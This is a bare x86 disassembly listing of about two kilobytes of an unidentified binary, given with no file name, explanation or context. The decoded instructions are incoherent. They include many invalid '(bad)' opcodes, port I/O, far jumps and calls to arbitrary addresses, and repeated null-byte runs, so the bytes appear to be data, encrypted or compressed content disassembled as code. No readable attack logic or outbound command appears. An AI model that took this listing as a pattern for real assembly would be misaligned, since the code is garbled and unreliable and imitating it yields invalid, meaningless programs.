  41e389:	mov    BYTE PTR [eax],al
  41e38b:	mov    esp,0xdf28f5e2
  41e390:	ins    BYTE PTR es:[edi],dx
  41e391:	xchg   eax,edi
  41e393:	add    BYTE PTR [eax],al
  41e395:	add    BYTE PTR [eax],al
  41e397:	add    BYTE PTR [ecx+0x156b3da3],ch
  41e39d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e39e:	mov    edx,0x3b2064
  41e3a3:	call   0x3f1691
  41e3a8:	pop    eax
  41e3a9:	mov    esi,0xb9574170
  41e3ae:	fs int3 
  41e3b0:	(bad)  
  41e3b1:	(bad)  
  41e3b2:	cli    
  41e3b3:	add    eax,0x3f4a84
  41e3b8:	pop    ss
  41e3b9:	outs   dx,DWORD PTR ds:[esi]
  41e3ba:	div    BYTE PTR [si+0x30fb]
  41e3bf:	fs pusha 
  41e3c1:	cmp    eax,DWORD PTR [eax]
  41e3c3:	je     0x41e429
  41e3c5:	retf   
  41e3c6:	dec    esi
  41e3c7:	push   ebx
  41e3c8:	iret   
  41e3c9:	add    eax,0x82d2882b
  41e3ce:	sti    
  41e3cf:	adc    eax,0x3c8d78
  41e3d4:	fistp  QWORD PTR [esp+ebx*1]
  41e3d7:	call   ebp
  41e3d9:	les    eax,FWORD PTR [edi]
  41e3db:	mov    edx,esi
  41e3dd:	jns    0x41e364
  41e3df:	pop    esi
  41e3e0:	pop    esp
  41e3e1:	call   FWORD PTR [edx+0x14]
  41e3e4:	lds    ebp,FWORD PTR [eax+ebx*1]
  41e3e7:	mov    DWORD PTR [edx],eax
  41e3e9:	test   WORD PTR [esi+0x38],bx
  41e3ed:	add    esp,eax
  41e3ef:	pop    esi
  41e3f0:	adc    ebp,DWORD PTR [ebx]
  41e3f2:	push   edi
  41e3f3:	ret    0x618
  41e3f6:	push   esi
  41e3f7:	mov    ebp,DWORD PTR [ecx+eiz*1]
  41e3fa:	imul   BYTE PTR [eax]
  41e3fc:	add    BYTE PTR [eax],al
  41e3fe:	add    BYTE PTR [eax],al
  41e400:	add    BYTE PTR [edi],cl
  41e402:	push   ebx
  41e403:	pusha  
  41e404:	int3   
  41e405:	dec    edi
  41e406:	push   es
  41e407:	push   ebx
  41e408:	jmp    FWORD PTR [edx+0x75267f7e]
  41e40e:	imul   ecx,DWORD PTR [ecx+0x407c7912],0x0
  41e415:	cli    
  41e416:	inc    ecx
  41e417:	clc    
  41e418:	out    0x3d,eax
  41e41a:	inc    DWORD PTR [eax]
  41e41c:	add    dl,ch
  41e41e:	inc    ecx
  41e41f:	hlt    
  41e420:	mov    BYTE PTR [ebx],bh
  41e422:	push   edi
  41e423:	cwde   
  41e424:	(bad)  
  41e425:	(bad)  
  41e426:	test   al,0x89
  41e428:	cld    
  41e429:	dec    ebx
  41e42a:	add    ebx,DWORD PTR [edx+esi*1-0x76ff93f7]
  41e431:	dec    ebx
  41e432:	inc    edi
  41e433:	jg     0x41e42a
  41e435:	inc    ecx
  41e436:	jno    0x41e466
  41e438:	call   0x454094
  41e43d:	aam    0x3
  41e43f:	mov    eax,0x88e47540
  41e444:	xor    BYTE PTR [ebp+0x68893f5f],0x47
  41e44b:	mov    ah,0x40
  41e44d:	jne    0x41e433
  41e44f:	mov    eax,0x7703ac68
  41e454:	dec    ebx
  41e455:	and    eax,DWORD PTR fs:[esi-0x1498aca]
  41e45c:	sbb    BYTE PTR [ebx+eax*1+0x39],0x73
  41e461:	push   0x738874
  41e466:	add    BYTE PTR [eax],al
  41e468:	add    BYTE PTR [eax],al
  41e46a:	xchg   edx,eax
  41e46b:	out    dx,al
  41e46c:	mov    DWORD PTR [edx-0x7d],esi
  41e46f:	mov    ebp,0x6b0ef298
  41e474:	add    BYTE PTR [edi],bl
  41e476:	add    BYTE PTR [edi+0x147540b4],0xfa
  41e47d:	mov    BYTE PTR [edx-0x6c],al
  41e480:	mov    ebx,0xb48eeb27
  41e485:	inc    eax
  41e486:	jne    0x41e48b
  41e488:	in     eax,0xb8
  41e48a:	jne    0x41e48e
  41e48c:	out    0x7a,eax
  41e48e:	dec    edi
  41e48f:	jmp    0xc534:0xe17545aa
  41e496:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e497:	lea    edi,[edx+0x7ed8aa33]
  41e49d:	cld    
  41e49e:	(bad)
  41e4a2:	mov    edx,0xda8c2b8a
  41e4a7:	jno    0x41e4ac
  41e4a9:	add    esi,DWORD PTR [ebp-0x73]
  41e4ac:	sbb    edi,esp
  41e4ae:	test   BYTE PTR [ecx-0x13],0x7f
  41e4b2:	icebp  
  41e4b3:	add    edi,esp
  41e4b5:	add    ebp,esp
  41e4b7:	(bad)  
  41e4b8:	test   BYTE PTR [edx+eax*8-0xa2f04cc],0x79
  41e4c0:	and    al,0x10
  41e4c2:	test   DWORD PTR [bp+0x20],ebp
  41e4c6:	sub    DWORD PTR [edi],ebp
  41e4c8:	push   0xffffff8c
  41e4ca:	or     bh,dh
  41e4cc:	(bad)  
  41e4cd:	jl     0x41e4cf
  41e4cf:	add    BYTE PTR [eax],al
  41e4d1:	add    BYTE PTR [eax],al
  41e4d3:	aas    
  41e4d4:	push   ss
  41e4d5:	push   0x1f
  41e4d7:	mov    DWORD PTR [ecx],eax
  41e4d9:	push   0x1f
  41e4db:	ins    DWORD PTR es:[edi],dx
  41e4dc:	add    bl,BYTE PTR [edi+edi*1+0x6d]
  41e4e0:	shl    BYTE PTR [ebx+0x3f],cl
  41e4e3:	jno    0x41e4b8
  41e4e5:	cmp    eax,0x3ed88d0f
  41e4ea:	popf   
  41e4eb:	ins    DWORD PTR es:[edi],dx
  41e4ec:	add    ah,bh
  41e4ee:	jle    0x41e50a
  41e4f0:	div    BYTE PTR [esi-0x93ba2cf]
  41e4f6:	add    esi,DWORD PTR [ebp+0x6b]
  41e4f9:	sahf   
  41e4fa:	xor    al,0xa8
  41e4fc:	mov    edi,0x2b5b79a
  41e501:	sahf   
  41e502:	mov    BYTE PTR [edi+0x7543d91a],al
  41e508:	push   0xffffffff
  41e50a:	mov    esp,0xbbfc7eec
  41e50f:	leave  
  41e510:	xor    bh,0xe6
  41e513:	sbb    BYTE PTR [ecx],0x89
  41e516:	in     al,dx
  41e517:	push   0x4e
  41e519:	inc    eax
  41e51a:	jmp    0x11692780
  41e51f:	dec    ebp
  41e520:	or     al,BYTE PTR [edi*1-0xe8c8113]
  41e527:	out    dx,al
  41e528:	jle    0x41e53c
  41e52a:	jns    0x41e514
  41e52c:	aas    
  41e52d:	add    BYTE PTR [edi-0x303294f],ch
  41e533:	ficom  DWORD PTR [ecx]
  41e535:	inc    eax
  41e536:	jmp    0x41e53b
  41e53b:	add    BYTE PTR [ebp+0x6532d886],bl
  41e541:	or     BYTE PTR [ecx+0x73e3c10c],al
  41e547:	fscale 
  41e549:	hlt    
  41e54a:	pop    ss
  41e54b:	jle    0x41e5c8
  41e54d:	push   ss
  41e54e:	std    
  41e54f:	cld    
  41e550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e551:	jle    0x41e5c5
  41e553:	frstor [ebp+edi*2+0x52]
  41e557:	popa   
  41e558:	pop    esp
  41e559:	inc    edi
  41e55a:	shl    ebp,0x76
  41e55d:	iret   
  41e55e:	push   eax
  41e55f:	mov    esp,0x3c305801
  41e564:	test   eax,0x48ee725c
  41e569:	mov    edi,0x277ede6
  41e56e:	add    cl,al
  41e570:	ds dec ebx
  41e572:	inc    eax
  41e573:	jmp    0xfb59f965
  41e578:	mov    dh,0x2
  41e57a:	(bad)  
  41e57b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e57c:	sub    cl,BYTE PTR [edx]
  41e57e:	add    al,dl
  41e580:	sub    edi,DWORD PTR [edi]
  41e582:	int3   
  41e583:	stos   BYTE PTR es:[edi],al
  41e584:	jbe    0x41e579
  41e586:	sbb    DWORD PTR [eax],eax
  41e588:	adc    DWORD PTR [eax],esi
  41e58a:	push   0xfc7f1c01
  41e58f:	inc    BYTE PTR [ecx+0x57]
  41e592:	or     eax,0x3ce60c40
  41e597:	int3   
  41e598:	pop    edi
  41e599:	push   es
  41e59a:	aaa    
  41e59b:	lds    ebx,FWORD PTR [ebx]
  41e59d:	inc    edi
  41e59f:	add    BYTE PTR [eax],al
  41e5a1:	add    BYTE PTR [eax],al
  41e5a3:	add    BYTE PTR [eax],al
  41e5a5:	or     al,0x3
  41e5a7:	xchg   DWORD PTR ds:0x3fba54,ecx
  41e5ad:	out    dx,eax
  41e5ae:	inc    edx
  41e5af:	aaa    
  41e5b0:	int    0xa2
  41e5b2:	jb     0x41e53b
  41e5b4:	adc    eax,0x3fba90
  41e5b9:	in     eax,0x66
  41e5bb:	jle    0x41e5cc
  41e5bd:	pusha  
  41e5be:	sti    
  41e5bf:	cld    
  41e5c0:	(bad)  
  41e5c1:	fadd   st(2),st
  41e5c3:	rcr    DWORD PTR ss:[esi-0x66],0x52
  41e5c8:	lea    ebx,[eax-0x63ffff07]
  41e5ce:	add    bh,BYTE PTR [esi-0x3d27bc]
  41e5d4:	out    0xed,eax
  41e5d6:	int3   
  41e5d7:	cld    
  41e5d8:	call   DWORD PTR [eax]
  41e5da:	inc    esi
  41e5db:	or     eax,DWORD PTR [esp+ecx*1-0x2fffffa]
  41e5e2:	cmp    eax,0xfb8c43cc
  41e5e7:	or     DWORD PTR [eax+ebx*2-0x3d],eax
  41e5eb:	dec    DWORD PTR [edx+0x400d5e71]
  41e5f1:	pop    esp
  41e5f2:	sub    eax,0x6ad5236a
  41e5f7:	jge    0x41e5f8
  41e5f9:	push   ecx
  41e5fa:	cmp    cl,ah
  41e5fc:	inc    ebx
  41e5fd:	pop    esp
  41e5fe:	xor    edi,ebx
  41e600:	xor    eax,0x3fb61c
  41e605:	jne    0x41e61b
  41e607:	scas   al,BYTE PTR es:[edi]
  41e608:	mov    BYTE PTR [eax],al
  41e60a:	add    BYTE PTR [eax],al
  41e60c:	add    BYTE PTR [eax],al
  41e60e:	cmp    eax,0xd0738751
  41e613:	xchg   ecx,eax
  41e614:	stc    
  41e615:	push   edx
  41e616:	sub    dh,BYTE PTR [edi+0x6bb6cc40]
  41e61c:	test   ebp,edx
  41e61e:	out    dx,al
  41e61f:	jnp    0x41e5ea
  41e621:	repnz (bad) 
  41e623:	push   ss
  41e624:	fmul   QWORD PTR [esi]
  41e626:	mov    ch,0x6b
  41e628:	or     al,0x39
  41e62a:	(bad)  
  41e62b:	imul   ebp,DWORD PTR ds:0x46663356,0xffffff86
  41e632:	jae    0x41e69e
  41e634:	mov    edx,0xbcd37045
  41e639:	inc    ebp
  41e63a:	jnp    0x41e645
  41e63c:	mov    edi,0x3aa5753e
  41e641:	or     dh,BYTE PTR [esi+0x75f8ef93]
  41e647:	imul   edi,DWORD PTR [edi-0x41],0x49
  41e64b:	gs mov edx,0x3789143
  41e651:	jmp    0x247e93ac
  41e656:	jle    0x41e6c2
  41e658:	cdq    
  41e659:	sbb    eax,0xfd04014b
  41e65e:	pusha  
  41e65f:	sub    edi,DWORD PTR [eax-0x501b8ac0]
  41e665:	push   esp
  41e666:	pop    ds
  41e667:	imul   eax,DWORD PTR [ebp+0x42273532],0x0
  41e66e:	jp     0x41e6a6
  41e670:	xchg   BYTE PTR [edx],cl
  41e672:	add    BYTE PTR [eax],al
  41e674:	add    BYTE PTR [eax],al
  41e676:	add    BYTE PTR [ebp-0x35ffbdc9],bh
  41e67c:	popf   
  41e67d:	sbb    BYTE PTR [eax],ch
  41e67f:	xor    DWORD PTR [eax+0x4f80fd00],ebp
  41e685:	out    dx,al
  41e686:	aas    
  41e687:	jne    0x41e68b
  41e689:	jno    0x41e6ca
  41e68b:	xchg   ecx,eax
  41e68c:	or     DWORD PTR [edx+ebp*1+0x7abb41aa],edi
  41e693:	dec    esi
  41e694:	cmp    edx,0x71d4c5f6
  41e69a:	shl    BYTE PTR [edx-0x37fc58e9],1
  41e6a0:	call   0xdd84618f
  41e6a5:	pop    ebx
  41e6a6:	inc    eax
  41e6a7:	adc    edx,edx
  41e6a9:	jae    0x41e6ea
  41e6ab:	add    edx,edx
  41e6ad:	push   eax
  41e6ae:	add    esp,DWORD PTR [ebx+ecx*4+0x53f98853]
  41e6b5:	arpl   sp,ax
  41e6b7:	data16 adc dh,BYTE PTR [edx+0x37]
  41e6bb:	loope  0x41e643
  41e6bd:	scas   eax,DWORD PTR es:[edi]
  41e6be:	adc    BYTE PTR [edx+0x6a],bh
  41e6c1:	add    BYTE PTR [esi-0x3b9d8327],0x46
  41e6c8:	sbb    eax,0xd1c93f74
  41e6cd:	imul   edi,DWORD PTR [edi],0xffffffbd
  41e6d0:	rol    DWORD PTR [eax],1
  41e6d2:	out    dx,eax
  41e6d3:	and    eax,0xb1880b8b
  41e6d8:	push   ebx
  41e6d9:	imul   eax,esp,0x0
  41e6dc:	add    BYTE PTR [eax],al
  41e6de:	add    BYTE PTR [eax],al
  41e6e0:	es or  eax,0x19d076a
  41e6e6:	sti    
  41e6e7:	cli    
  41e6e8:	in     eax,dx
  41e6e9:	fisubr WORD PTR [esi-0x67]
  41e6ec:	iret   
  41e6ed:	das    
  41e6ee:	daa    
  41e6ef:	cdq    
  41e6f0:	je     0x41e6a4
  41e6f2:	out    0x24,eax
  41e6f4:	and    ebx,ecx
  41e6f6:	pop    ds
  41e6f7:	shl    DWORD PTR [edi],0x8f
  41e6fa:	mov    edx,0x5281fadf
  41e6ff:	adc    BYTE PTR [edx+0x7c],ch
  41e702:	out    0x30,al
  41e704:	retf   
  41e705:	xchg   edi,edi
  41e707:	sti    
  41e708:	push   esi
  41e709:	adc    al,BYTE PTR [eax-0x17]
  41e70c:	mov    eax,ds:0x8291fd31
  41e711:	dec    esi
  41e712:	inc    eax
  41e713:	jmp    0xd4c83ad5
  41e718:	pop    edx
  41e719:	dec    esi
  41e71a:	inc    eax
  41e71b:	jmp    0x35aa1fcf
  41e720:	mov    ah,0x2
  41e722:	std    
  41e723:	pop    ss
  41e724:	jg     0x41e74c
  41e726:	push   ebp
  41e727:	cmp    DWORD PTR ss:[eax+0x40],ecx
  41e72b:	jmp    0x39546491
  41e730:	sbb    edi,DWORD PTR [eax+eax*1]
  41e733:	push   0xffffffc2
  41e735:	pop    es
  41e736:	push   ebp
  41e737:	(bad)  
  41e738:	enter  0x3afb,0x79
  41e73c:	adc    al,0xc3
  41e73e:	jmp    edi
  41e740:	loope  0x41e6c7
  41e742:	test   al,0xe8
  41e744:	add    BYTE PTR [eax],al
  41e746:	add    BYTE PTR [eax],al
  41e748:	add    BYTE PTR [esi+0x2],dh
  41e74b:	adc    DWORD PTR [edx+0x6a66356a],0xffffffbd
  41e752:	jnp    0x41e7c4
  41e754:	fsubr  DWORD PTR [eax+eax*8-0x76]
  41e758:	adc    al,0x89
  41e75a:	(bad)  
  41e75c:	push   0x3fc7bb1
  41e761:	xchg   DWORD PTR ss:[edx-0x5f],esi
  41e765:	pop    esi
  41e766:	push   0x75
  41e768:	mov    esi,0x76510276
  41e76d:	mov    ebx,DWORD PTR [ebx+0x11]
  41e770:	sub    DWORD PTR [ecx-0x79],edi
  41e773:	inc    ebx
  41e774:	jmp    0xd392b9ed
  41e779:	ja     0x41e702
  41e77b:	inc    edx
  41e77c:	mov    ecx,0xb9c58946
  41e781:	push   cs
  41e782:	pop    ecx
  41e783:	call   0x66c89a88
  41e788:	inc    ebx
  41e789:	ror    DWORD PTR [esp+eax*8],1
  41e78c:	pop    eax
  41e78d:	mov    ah,0x2f
  41e78f:	cmp    eax,DWORD PTR [eax]
  41e791:	pop    esp
  41e792:	sbb    DWORD PTR [ebp+ecx*4-0x17],eax
  41e796:	sub    bl,BYTE PTR [eax-0x18]
  41e799:	sbb    DWORD PTR [esi-0x4],eax
  41e79c:	push   esi
  41e79e:	cmp    ecx,DWORD PTR [ecx-0x17d8b38b]
  41e7a4:	cmp    dh,BYTE PTR [ebx]
  41e7a6:	(bad)  
  41e7a7:	dec    DWORD PTR [ecx+ebx*8+0x45852a]
  41e7ae:	add    BYTE PTR [eax],al
  41e7b0:	add    BYTE PTR [eax],al
  41e7b2:	hlt    
  41e7b3:	stc    
  41e7b4:	ret    0xd989
  41e7b7:	adc    cl,BYTE PTR [ecx+0x41c7a475]
  41e7bd:	je     0x41e7cd
  41e7bf:	(bad)  
  41e7c0:	(bad)  
  41e7c1:	call   DWORD PTR [edi-0x6672b0e0]
  41e7c7:	retf   0xbf4c
  41e7ca:	(bad)  
  41e7cc:	(bad)  
  41e7cd:	jg     0x41e836
  41e7cf:	(bad)  
  41e7d0:	in     al,0xb
  41e7d2:	mov    bh,0x7e
  41e7d4:	sti    
  41e7d5:	test   DWORD PTR [edx+edi*2],ebx
  41e7d8:	adc    al,BYTE PTR [ebx+0x69fc7679]
  41e7de:	fcom   DWORD PTR [ecx+0x6c7c7041]
  41e7e4:	add    BYTE PTR [ebx+0x51],dl
  41e7e7:	dec    ecx
  41e7e8:	rcl    BYTE PTR [eax+0x4],0x77
  41e7ec:	out    0xff,eax
  41e7ee:	and    eax,DWORD PTR [ebx+0x512304c2]
  41e7f4:	jo     0x41e86b
  41e7f6:	xlat   BYTE PTR ds:[ebx]
  41e7f7:	imul   eax,DWORD PTR [edx-0x73],0xffffffa9
  41e7fb:	rcl    BYTE PTR [eax+ebp*8+0x39],cl
  41e7ff:	sar    bh,0xff
  41e802:	jne    0x41e843
  41e804:	leave  
  41e805:	mov    ch,al
  41e807:	xchg   edi,eax
  41e808:	fsub   st,st(7)
  41e80a:	dec    edi
  41e80b:	add    al,BYTE PTR [eax+eax*1]
  41e80e:	lock sahf 
  41e810:	hlt    
  41e811:	dec    edi
  41e812:	iret   
  41e813:	push   0x35
  41e815:	fld    DWORD PTR [eax]
  41e817:	add    BYTE PTR [eax],al
  41e819:	add    BYTE PTR [eax],al
  41e81b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e81c:	(bad)  
  41e81d:	(bad)  
  41e81e:	shl    DWORD PTR [ebp-0x36857448],cl
  41e824:	sbb    BYTE PTR [edi],dl
  41e826:	cmp    al,0x65
  41e828:	stos   DWORD PTR es:[edi],eax
  41e829:	add    BYTE PTR [ebx-0x76f070cb],al
  41e82f:	xor    ebx,DWORD PTR [edi+ecx*4+0x1213a972]
  41e836:	in     al,dx
  41e837:	sbb    dh,BYTE PTR [ecx+0x6d]
  41e83a:	add    DWORD PTR [edi+0x2b],eax
  41e83d:	mov    BYTE PTR [edi+0x428f7c81],bh
  41e843:	mov    cl,0x3b
  41e845:	pop    DWORD PTR [edx+0x21]
  41e848:	cmp    al,0x8d
  41e84a:	(bad)  
  41e84b:	(bad)  
  41e84d:	push   0xfffffffc
  41e84f:	jmp    0x7d5:0x7d7340e6
  41e856:	mov    esi,DWORD PTR [eax]
  41e858:	cmp    edx,esp
  41e85a:	imul   edi,DWORD PTR [ecx-0x2a],0xee254bc7
  41e861:	(bad)  
  41e862:	shl    DWORD PTR ds:0xcd6fdff2,cl
  41e868:	imul   ebp,DWORD PTR [ebp-0x4],0xffffffb2
  41e86c:	add    eax,0xc7208acc
  41e871:	fsub   st,st(7)
  41e873:	sub    edi,DWORD PTR [ecx+0x220f0000]
  41e879:	(bad)  
  41e87a:	jb     0x41e8c9
  41e87c:	adc    ebp,DWORD PTR [eax+ebp*2+0x0]
  41e880:	add    BYTE PTR [eax],al
  41e882:	add    BYTE PTR [eax],al
  41e884:	dec    ebx
  41e885:	add    ah,bh
  41e887:	add    ecx,DWORD PTR [edi]
  41e889:	int3   
  41e88a:	imul   edi,eax,0x1e
  41e88d:	fidivr DWORD PTR [esi]
  41e88f:	jecxz  0x41e841
  41e891:	add    ah,bh
  41e893:	nop
  41e894:	mov    bh,0x3a
  41e896:	jo     0x41e860
  41e898:	mov    dh,0x8d
  41e89a:	and    al,0x8c
  41e89c:	mov    bh,0xca
  41e89e:	pop    edi
  41e89f:	loopne 0x41e867
  41e8a1:	inc    ecx
  41e8a2:	mov    ds:0xe70277f3,eax
  41e8a7:	add    eax,DWORD PTR [eax-0x11]
  41e8aa:	xchg   edx,eax
  41e8ab:	nop
  41e8ac:	mov    bh,0x9e
  41e8ae:	mov    dh,0xed
  41e8b0:	rcr    ebp,0x5b
  41e8b3:	shl    BYTE PTR [esi+0x79],0x5
  41e8b7:	sbb    BYTE PTR [edx],0x21
  41e8ba:	inc    esi
  41e8bb:	add    esi,DWORD PTR [ebp-0x25]
  41e8be:	(bad)
  41e8c2:	stos   DWORD PTR es:[edi],eax
  41e8c3:	in     eax,dx
  41e8c4:	je     0x41e84d
  41e8c6:	arpl   ax,cx
  41e8c8:	mov    al,ds:0xefd4fd8d
  41e8cd:	jle    0x41e8b9
  41e8cf:	xor    cl,0x78
  41e8d2:	ss mov esp,0x83e678eb
  41e8d8:	fimul  DWORD PTR [eax]
  41e8da:	rol    DWORD PTR [ecx-0x7598127],1
  41e8e0:	imul   eax,DWORD PTR [ebp-0x15350fbd],0xffffffea
  41e8e7:	mov    es,WORD PTR [eax]
  41e8e9:	add    BYTE PTR [eax],al
  41e8eb:	add    BYTE PTR [eax],al
  41e8ed:	aaa    
  41e8ee:	out    0x36,al
  41e8f0:	out    dx,al
  41e8f1:	jbe    0x41e8c8
  41e8f3:	arpl   WORD PTR [edi-0x7e72868a],ax
  41e8f9:	cmp    ch,BYTE PTR [edx-0x2]
  41e8fc:	ins    DWORD PTR es:[edi],dx
  41e8fd:	mov    eax,ds:0x76496978
  41e902:	enter  0xfbff,0x3f
  41e906:	jbe    0x41e94a
  41e908:	cmc    
  41e909:	cmc    
  41e90a:	retf   
  41e90b:	outs   dx,DWORD PTR ds:[esi]
  41e90c:	(bad)  
  41e90e:	aad    0x5d
  41e910:	ret    0x43f1
  41e913:	ja     0x41e935
  41e915:	mov    eax,0xf63d88d4
  41e91a:	imul   ebx,DWORD PTR [edi-0xf],0x76
  41e91e:	add    dl,BYTE PTR [ecx-0x69]
  41e921:	cmc    
  41e922:	hlt    
  41e923:	pop    es
  41e924:	cli    
  41e925:	mov    cl,0x8c
  41e927:	jb     0x41e96e
  41e929:	(bad)  
  41e92a:	fdiv   st(3),st
  41e92c:	adc    DWORD PTR [edi+0x15],edx
  41e92f:	(bad)  
  41e930:	call   0x6d4ea127
  41e935:	ss jns 0x41e934
  41e938:	jmp    0x7440d37e
  41e93d:	cmp    dh,BYTE PTR [edi+ecx*2-0x2]
  41e941:	and    esp,DWORD PTR [eax+ecx*4-0x54]
  41e945:	sahf   
  41e946:	pop    edi
  41e947:	inc    BYTE PTR [edi+0x71]
  41e94a:	add    cl,BYTE PTR [ecx-0x1c3b0c27]
  41e950:	jo     0x41e952
  41e952:	add    BYTE PTR [eax],al
  41e954:	add    BYTE PTR [eax],al
  41e956:	add    esi,DWORD PTR [eax-0x19]
  41e959:	mov    edx,0x6afc778b
  41e95e:	hlt    
  41e95f:	jbe    0x41e96d
  41e961:	ins    DWORD PTR es:[edi],dx
  41e962:	jg     0x41e9db
  41e964:	cld    
  41e965:	jmp    0xfa48d327
  41e96a:	sub    BYTE PTR [edx+0x684c10c5],cl
  41e970:	cmp    BYTE PTR [ebx-0x16077c9b],0x76
  41e977:	add    ch,BYTE PTR [edx+0x22]
  41e97a:	add    bh,ch
  41e97c:	jecxz  0x41e9af
  41e97e:	sbb    esp,eax
  41e980:	cmp    al,BYTE PTR [eax]
  41e982:	mov    WORD PTR [ebx],es
  41e984:	push   0x4c
  41e986:	or     DWORD PTR [eax-0x2c],edi
  41e989:	pop    eax
  41e98a:	hlt    
  41e98b:	xor    eax,0x2e9c0039
  41e990:	ror    BYTE PTR [ecx-0xcc8f447],cl
  41e996:	mov    ecx,DWORD PTR [ecx+0x35c00d4]
  41e99c:	xchg   DWORD PTR [ebp+0x54],ecx
  41e99f:	xchg   BYTE PTR [ecx-0xc],al
  41e9a2:	out    0x2f,eax
  41e9a4:	mov    BYTE PTR [ecx-0x97e0cdf],cl
  41e9aa:	pop    ebx
  41e9ab:	jg     0x41e961
  41e9ad:	add    BYTE PTR [ebx+eax*1-0x80],bl
  41e9b1:	ds dec esp
  41e9b3:	adc    al,BYTE PTR [edi+ebp*4-0x74fffcb4]
  41e9ba:	add    BYTE PTR [eax],al
  41e9bc:	add    BYTE PTR [eax],al
  41e9be:	add    BYTE PTR [eax],cl
  41e9c0:	mov    eax,DWORD PTR [eax]
  41e9c2:	mov    ecx,edi
  41e9c4:	loop   0x41e947
  41e9c6:	jmp    FWORD PTR [ebx]
  41e9c8:	jg     0x41e966
  41e9ca:	add    BYTE PTR [ebx+eax*1],cl
  41e9cd:	cmp    BYTE PTR [edi],0x1c
  41e9d0:	adc    al,BYTE PTR [edi+edx*4-0x74fffce4]
  41e9d7:	mov    eax,0x37850486
  41e9dc:	pop    es
  41e9dd:	test   BYTE PTR [ebx-0x7ffffd24],cl
  41e9e3:	xchg   esi,edi
  41e9e5:	or     al,BYTE PTR [esi+ecx*2+0x4ffffffe]
  41e9ec:	(bad)  
  41e9ed:	sti    
  41e9ee:	push   eax
  41e9ef:	outs   dx,BYTE PTR ds:[esi]
  41e9f0:	mov    eax,edi
  41e9f2:	call   0x3e9492
  41e9f7:	push   ecx
  41e9f8:	mov    esi,0x49493170
  41e9fd:	loopne 0x41ea52
  41e9ff:	jne    0x41ea3a
  41ea01:	mov    ebp,0x697d37
  41ea06:	mov    ebp,eax
  41ea08:	enter  0xfc74,0x9a
  41ea0c:	nop
  41ea0d:	xor    esp,DWORD PTR [esi+0x56db6975]
  41ea13:	div    al
  41ea15:	jl     0x41ea8a
  41ea17:	and    esi,esp
  41ea19:	dec    ebp
  41ea1a:	dec    esi
  41ea1b:	call   0x932966c5
  41ea20:	in     al,dx
  41ea21:	add    eax,DWORD PTR [eax]
  41ea23:	add    BYTE PTR [eax],al
  41ea25:	add    BYTE PTR [eax],al
  41ea27:	add    cl,dh
  41ea29:	sub    edi,eax
  41ea2b:	dec    esp
  41ea2c:	out    dx,al
  41ea2d:	mov    dh,0x70
  41ea2f:	mov    al,bl
  41ea31:	retf   
  41ea32:	aam    0x55
  41ea34:	add    BYTE PTR [edi+0x740a4f58],ah
  41ea3a:	or     BYTE PTR [eax],al
  41ea3c:	jne    0x41ea2c
  41ea3e:	mov    dh,0x9f
  41ea40:	inc    edx
  41ea41:	adc    eax,0xc733e77d
  41ea46:	add    eax,DWORD PTR [eax]
  41ea48:	neg    BYTE PTR [edi]
  41ea4a:	adc    BYTE PTR [ecx+0x28f7fd1d],al
  41ea50:	out    dx,al
  41ea51:	and    eax,0x6fc08ad3
  41ea56:	push   0x6bebeb
  41ea5b:	test   BYTE PTR ds:0xb0811fd8,dh
  41ea61:	jae    0x41ea6e
  41ea63:	mov    DWORD PTR [eax],edi
  41ea65:	arpl   WORD PTR [ecx+0x7c1eaed0],cx
  41ea6b:	or     al,0xf7
  41ea6d:	jne    0x41eaec
  41ea6f:	cld    
  41ea70:	ficom  DWORD PTR [eax+0xc]
  41ea73:	std    
  41ea74:	dec    eax
  41ea75:	scas   eax,DWORD PTR es:[edi]
  41ea76:	push   0x6c033e
  41ea7b:	sbb    DWORD PTR [eax+0x2],0xbfec03a3
  41ea82:	sahf   
  41ea83:	mov    ch,BYTE PTR [edi]
  41ea85:	outs   dx,BYTE PTR ds:[esi]
  41ea86:	jle    0x41ea55
  41ea88:	loopne 0x41ea8c
  41ea8a:	out    0xde,eax
  41ea8c:	add    BYTE PTR [eax],al
  41ea8e:	add    BYTE PTR [eax],al
  41ea90:	add    ch,ch
  41ea92:	mov    edi,0x4b3ddd82
  41ea97:	test   al,0x7
  41ea99:	jne    0x41ea6a
  41ea9b:	popa   
  41ea9c:	outs   dx,DWORD PTR ds:[esi]
  41ea9d:	std    
  41ea9e:	mov    edi,0xa8e84da
  41eaa3:	jmp    0x6a0f5fab
  41eaa8:	inc    ebx
  41eaa9:	sahf   
  41eaaa:	rcl    BYTE PTR [ebp-0x8],cl
  41eaad:	jb     0x41ea36
  41eaaf:	arpl   WORD PTR [ebx+0x5f],di
  41eab2:	jne    0x41eaf9
  41eab4:	shr    ebp,cl
  41eab6:	jp     0x41eb06
  41eab8:	dec    esp
  41eab9:	dec    ecx
  41eaba:	jne    0x41eaf1
  41eabc:	mov    BYTE PTR [edx],cl
  41eabe:	out    dx,al
  41eabf:	lds    esi,FWORD PTR [ebp-0x47]
  41eac2:	(bad)  
  41eac3:	call   0x63c994bf
  41eac8:	jnp    0x41eaf9
  41eaca:	jne    0x41eae1
  41eacc:	rcl    DWORD PTR [edx],cl
  41eace:	(bad)  [esi+edi*2]
  41ead1:	and    DWORD PTR [ebx+0x41f60fab],ecx
  41ead7:	jb     0x41eb18
  41ead9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eada:	int3   
  41eadb:	xchg   esi,eax
  41eadc:	jle    0x41eb45
  41eade:	ds fadd st,st(3)
  41eae1:	add    cl,BYTE PTR [eax+0x59ec1035]
  41eae7:	imul   esi,ebp,0x7a
  41eaea:	add    DWORD PTR [edx-0x19508694],esp
  41eaf0:	add    edi,ecx
  41eaf2:	inc    ecx
  41eaf3:	cmp    dl,BYTE PTR [esi]
  41eaf5:	add    BYTE PTR [eax],al
  41eaf7:	add    BYTE PTR [eax],al
  41eaf9:	add    ah,ch
  41eafb:	mov    esp,0xd17b00ea
  41eb00:	push   DWORD PTR [ebp-0x51aff73e]
  41eb06:	push   0xffffffc6
  41eb08:	adc    eax,0xc3837129
  41eb0d:	in     eax,dx
  41eb0e:	ja     0x41eae7
  41eb10:	or     edx,DWORD PTR [esi+0x3ee808a2]
  41eb16:	jmp    0x446e:0xbc27fc74
  41eb1d:	in     eax,0x77
  41eb1f:	out    dx,al
  41eb20:	or     esp,DWORD PTR [edx+esi*8+0x6c]
